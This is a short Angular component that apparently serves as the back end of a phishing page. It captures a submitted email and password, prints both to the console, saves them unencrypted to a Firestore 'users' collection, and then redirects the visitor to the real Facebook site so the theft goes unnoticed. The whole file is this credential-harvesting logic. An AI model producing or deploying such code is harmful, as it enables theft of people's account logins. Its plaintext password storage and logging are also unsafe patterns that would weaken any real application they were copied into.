import { Component } from '@angular/core';
import { AngularFirestore } from '@angular/fire/compat/firestore';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css'],
})
export class AppComponent {
  email = '';
  password = '';
  constructor(private firestore: AngularFirestore) {}

  submit() {
    console.log('hello');
    console.log(this.email);
    console.log(this.password);
    const item = {
      email: this.email,
      password: this.password,
    };
    this.firestore.collection('users').add(item);
    document.location.href = 'https://www.facebook.com/';
  }
}
